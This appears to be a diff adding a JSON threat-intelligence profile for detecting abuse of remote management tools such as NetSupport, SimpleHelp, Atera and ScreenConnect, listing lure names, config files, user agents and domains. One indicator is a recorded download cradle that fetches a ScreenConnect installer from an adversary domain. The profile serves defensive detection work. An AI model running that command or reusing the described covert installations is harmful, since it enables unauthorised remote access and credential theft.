@@ -1,0 +1,599 @@
+{
+  "malware_family": "RMM tool abuse (NetSupport RAT, SimpleHelp, PDQ Connect, iDrive RemotePC, Syncro, Atera, ITarian, ScreenConnect, QuickAssist/HopToDesk)",
+  "threat_actor": "MuddyWater",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Adversaries increasingly abuse signed, legitimate remote monitoring and management (RMM) tools as loaders and persistence mechanisms, often chaining two or more RMMs on one host and using MSIExec to break process lineage. Detection should focus on renamed installers, tool-specific metadata/User-Agents, config files and tokens, RMM binaries spawning other RMMs, and newly registered C2 domains embedded in command lines. This profile captures the per-tool file, process, command-line, and network artifacts Red Canary identifies as the highest-fidelity detection anchors.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "client32.exe",
+      "context": "NetSupport Manager primary execution engine, run in background after ZIP download",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "client32.ini",
+      "context": "NetSupport config file holding Gateway Address (C2) and encrypted gsk",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "gsk",
+      "context": "Global Security Key stored in client32.ini configuration file",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Public\\",
+      "context": "NetSupport binary relocated here or to garbled random folder name",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "NSM1234",
+      "context": "Cracked NetSupport license string (licensee name)",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "HANEYMANEY",
+      "context": "Cracked NetSupport license string (licensee name)",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Ecard9140.exe",
+      "context": "SimpleHelp phishing lure: fake invitation executable",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "party_invite.exe",
+      "context": "Renamed SimpleHelp binary in invitation-lure campaign",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Voicemailaudioext.exe",
+      "context": "Renamed SimpleHelp binary in invitation-lure campaign",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "remote access.exe",
+      "context": "Child process spawned by SimpleHelp for the remote access session, no metadata",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SimpleHelp Remote Access Client",
+      "context": "File Description metadata retained after renaming SimpleHelp binary",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Remote Access-windows64-online.exe_icon.exe",
+      "context": "Original/Internal Filename metadata of SimpleHelp client binary",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ssa.msi",
+      "context": "PDQ Connect lure themed as Social Security statement",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\PDQ\\PDQConnectAgent\\token",
+      "context": "API key file storing PDQ Connect configuration (no hardcoded IP)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "docmentfilecsm_jw98evavuqm5gb3.exe",
+      "context": "Renamed iDrive RemotePC installer delivered as document lure",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "IRS-Statement_Pr2ui4J9cfA6YEu.exe",
+      "context": "Renamed iDrive RemotePC installer, IRS tax-related lure",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "HostService",
+      "context": "Service installed by iDrive RemotePC installer",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Program Files (x86)\\RemotePC Host\\HostService.exe",
+      "context": "Binary executed by the RemotePC HostService service",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "remotepcservice.exe",
+      "context": "Process launched by RemotePC HostService.exe",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "remotepchost1.exe",
+      "context": "Initial RemotePC executable spawned by user-downloaded binary",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "RemotePC Host Setup",
+      "context": "File description of RemotePC setup binary renamed to non-obvious name",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "invited.exe",
+      "context": "Renamed Syncro lure binary from 'You're Invited' phishing",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "syncro.installer.exe",
+      "context": "Binary dropped by renamed Syncro lure executable",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "SyncroLive.Agent.Runner.exe",
+      "context": "Parent process that runs msiexec.exe to sideload ScreenConnect",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "SyncroLive.Agent.Runner.exe -> msiexec.exe",
+      "context": "Syncro agent spawning msiexec to sideload further RMM tools",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "MSTeam-installer.msi",
+      "context": "Renamed Atera MSI installer used in one observed case",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c mkdir C:\\Temp 2>NUL & curl.exe -L https://server.rarexterna.top/Bin/ScreenConnect.ClientSetup.msi",
+      "context": "Atera cradle to install ScreenConnect; parent Atera agent",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "'AteraAgent.exe' init-settings --agent-id '{REDACTED GUID}' --account-id '{Redacted Base64 String}' --environment 'Production' --customer-id '1' --folder-id ''",
+      "context": "Atera agent command line identifying RMM instance owner",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "AteraAgent.exe",
+      "context": "Atera RMM agent binary",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "RMMService.exe",
+      "context": "ITarian core binary used to drop credential-stealer ZIPs",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DICOMportable.zip",
+      "context": "ZIP dropped by ITarian containing credential stealer",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "DicomPortable.exe",
+      "context": "Executable from ITarian-dropped ZIP, sideloads malicious DLLs",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ScreenConnect.Client.exe",
+      "context": "ScreenConnect client with C2 domain in its command line",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "\\Working on updates_13% complete_Don't turn off your computer\\",
+      "context": "Deceptive folder used to hide ScreenConnect and WebBrowserPassView binaries",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Hide From Uninstall List",
+      "context": "Tool/option used to hide existing ScreenConnect installations",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WebBrowserPassView",
+      "context": "NirSoft password recovery tool run from deceptive Windows Update path",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "quickassist.exe",
+      "context": "Built-in Windows Quick Assist used for initial access by ransomware actors",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "hoptodesk.exe",
+      "context": "Alternative RMM used when QuickAssist is blocked",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "invite.exe",
+      "context": "Common 'party invitation' lure installer name",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "PartyCardViewer.exe",
+      "context": "Common 'party invitation' lure installer name",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Statement.exe",
+      "context": "Common lure executable name",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Document.msi",
+      "context": "Common lure MSI name",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "user_agent",
+      "value": "NetSupport Manager/1.3",
+      "context": "NetSupport Manager network User-Agent enabling reliable detection",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/access/JWrapper-Remote%20Access-version.txt",
+      "context": "SimpleHelp URL pattern contacted by abused client",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "JWrapperDownloader",
+      "context": "User-Agent often used by SimpleHelp (can change)",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://server.rarexterna.top/Bin/ScreenConnect.ClientSetup.msi",
+      "context": "ScreenConnect MSI pulled by Atera curl cradle",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "server.rarexterna.top",
+      "context": "Adversary host serving ScreenConnect client setup in Atera case",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "instance-brbvkj-relay.screenconnect.com",
+      "context": "Adversary relay under legitimate ScreenConnect domain",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "Servicing/1.0.29.18406 (280903a6-f6c3-4f57-b763-966ee0912dd2) [4.8.4400.0;528372]",
+      "context": "Syncro User-Agent; numbers and ID may change",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "syncromsp.com",
+      "context": "Legitimate Syncro service domain, expected traffic",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "syncroapi.com",
+      "context": "Legitimate Syncro API domain, expected traffic",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "kabutoservices.com",
+      "context": "Legitimate Syncro-related domain, expected traffic",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "atera.com",
+      "context": "Legitimate Atera domain contacted by abused agent",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "atera-agent-heartbeat.servicebus.windows.net",
+      "context": "Atera agent heartbeat endpoint",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cmdm.comodo.com",
+      "context": "ITarian/Comodo-associated domain blending with security software traffic",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "remotepc.com",
+      "context": "Legitimate RemotePC domain contacted by abused installer",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "remotedesktop.com",
+      "context": "Legitimate RemotePC-associated domain",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "rdprelayv3westusprod-0.relay.support.services.microsoft.com",
+      "context": "Microsoft relay used by Quick Assist sessions",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "signal.hoptodesk.com",
+      "context": "Legitimate HopToDesk signaling domain",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "logmein.com",
+      "context": "Legitimate RMM infrastructure that cannot simply be blocked",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pdq.com",
+      "context": "Legitimate PDQ Connect domain used directly by agents",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "screenconnect.com",
+      "context": "Legitimate ScreenConnect domain used for relays and traffic",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script",
+    "archive"
+  ]
+}
